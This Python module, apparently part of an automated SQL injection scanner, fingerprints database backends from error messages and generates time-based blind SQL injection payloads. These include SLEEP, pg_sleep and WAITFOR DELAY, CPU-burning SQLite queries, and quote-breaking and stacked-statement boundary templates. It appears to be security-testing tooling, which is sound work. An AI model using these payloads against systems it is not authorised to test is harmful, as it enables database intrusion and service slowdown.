"""
agent/dbms_fingerprint.py — Identify the backend DBMS from error signatures

Ghauri/sqlmap tailor payloads and confirm findings per-DBMS. We fingerprint the
database from error messages leaked in responses, which (a) raises confidence,
(b) lets the report name the exact backend, and (c) explains which time/error
payloads are expected to work.
"""
import re
from typing import Optional, Dict, List

# DBMS → list of regexes that strongly indicate that backend.
DBMS_ERRORS: Dict[str, List[str]] = {
    "MySQL": [
        r"SQL syntax.*MySQL", r"Warning.*\bmysqli?_", r"valid MySQL result",
        r"MySqlClient\.", r"check the manual that corresponds to your (MySQL|MariaDB)",
        r"MySQLSyntaxErrorException", r"com\.mysql\.jdbc", r"Unknown column '[^']+' in",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR", r"pg_query\(\)", r"PSQLException", r"org\.postgresql",
        r"unterminated quoted string at or near", r"syntax error at or near",
    ],
    "Microsoft SQL Server": [
        r"Microsoft SQL.*Server", r"ODBC SQL Server Driver",
        r"Unclosed quotation mark after the character string",
        r"System\.Data\.SqlClient\.", r"SQLServerException", r"Incorrect syntax near",
    ],
    "Oracle": [
        r"ORA-\d{5}", r"Oracle error", r"quoted string not properly terminated",
        r"PLS-\d{4}", r"oracle\.jdbc",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception", r"sqlite3\.OperationalError",
        r"SQLITE_ERROR", r"unrecognized token", r"near \".+\": syntax error",
        r"no such (table|column)", r"ambiguous column",
    ],
    "Microsoft Access": [
        r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine",
    ],
    "IBM DB2": [r"CLI Driver.*DB2", r"DB2 SQL error", r"SQLCODE"],
}

_COMPILED = {db: [re.compile(p, re.IGNORECASE) for p in pats]
             for db, pats in DBMS_ERRORS.items()}


def fingerprint(body: str) -> Optional[str]:
    """Return the DBMS name if an error signature is present, else None."""
    if not body:
        return None
    for dbms, patterns in _COMPILED.items():
        for p in patterns:
            if p.search(body):
                return dbms
    return None


# Delay forms per DBMS for the time-based oracle. {d} = delay seconds.
#   "and"     — an AND-able boolean expression that pauses then evaluates true;
#               usable inside `WHERE col = <here>` once the boundary is closed.
#   "stacked" — a standalone statement appended after ';' (needs multi-statement).
TIME_DELAYS: Dict[str, Dict[str, str]] = {
    # SQLite has no sleep(); force CPU work with a recursive CTE counter (no blob
    # size limit, low memory, scales ~1s per 6M iterations → ~{d}s). count(*)
    # forces full iteration; k>=0 is always true so it reads as a boolean AND.
    "SQLite":               {"and": "1=(SELECT 1 FROM (WITH RECURSIVE c(x) AS "
                                     "(SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{d}*6000000) "
                                     "SELECT count(*) AS k FROM c) WHERE k>=0)"},
    "MySQL":                {"and": "SLEEP({d})",
                             "stacked": "SELECT SLEEP({d})"},
    "PostgreSQL":           {"and": "(SELECT 1 FROM pg_sleep({d}))=1",
                             "stacked": "SELECT pg_sleep({d})"},
    "Microsoft SQL Server": {"stacked": "WAITFOR DELAY '0:0:{d}'"},
}

# Injection boundaries: how to break out of the parameter's SQL context before the
# delay so it actually executes. Covers numeric and quoted/parenthesised string
# contexts (e.g. `WHERE name = '<here>'`). {bv}=baseline value, {expr}=delay form.
TIME_AND_BOUNDARIES = [
    ("numeric",      "{bv} AND {expr}"),
    ("single-quote", "{bv}' AND {expr}-- -"),
    ("double-quote", '{bv}" AND {expr}-- -'),
    ("paren-single", "{bv}') AND {expr}-- -"),
    ("paren-numeric", "{bv}) AND {expr}-- -"),
]
TIME_STACKED_BOUNDARIES = [
    ("numeric-stacked",      "{bv}; {expr}-- -"),
    ("single-quote-stacked", "{bv}'; {expr}-- -"),
]


def time_oracle_payloads(bv: str, d: int, dbms: Optional[str] = None) -> List[tuple]:
    """Build (label, payload) candidates for the time-based oracle.

    Tries the fingerprinted DBMS first (if known), then the rest, each across every
    injection boundary so a delay is detected in numeric AND quoted/paren contexts.
    """
    order = list(TIME_DELAYS)
    if dbms in TIME_DELAYS:
        order = [dbms] + [d_ for d_ in order if d_ != dbms]

    seen, out = set(), []
    for name in order:
        forms = TIME_DELAYS[name]
        if "and" in forms:
            for blabel, btmpl in TIME_AND_BOUNDARIES:
                expr = forms["and"].format(d=d)
                payload = btmpl.format(bv=bv, expr=expr)
                if payload not in seen:
                    seen.add(payload)
                    out.append((f"{name}/{blabel}", payload))
        if "stacked" in forms:
            for blabel, btmpl in TIME_STACKED_BOUNDARIES:
                expr = forms["stacked"].format(d=d)
                payload = btmpl.format(bv=bv, expr=expr)
                if payload not in seen:
                    seen.add(payload)
                    out.append((f"{name}/{blabel}", payload))
    return out


# Backwards-compatible simple map (numeric boundary) — retained for callers/tests.
TIME_PAYLOADS = {
    "MySQL":                "{bv} AND SLEEP({d})",
    "PostgreSQL":           "{bv};SELECT pg_sleep({d})-- -",
    "Microsoft SQL Server": "{bv};WAITFOR DELAY '0:0:{d}'-- -",
    "SQLite":               "{bv} AND 1=(SELECT 1 FROM (SELECT randomblob(300000000))x)",
}
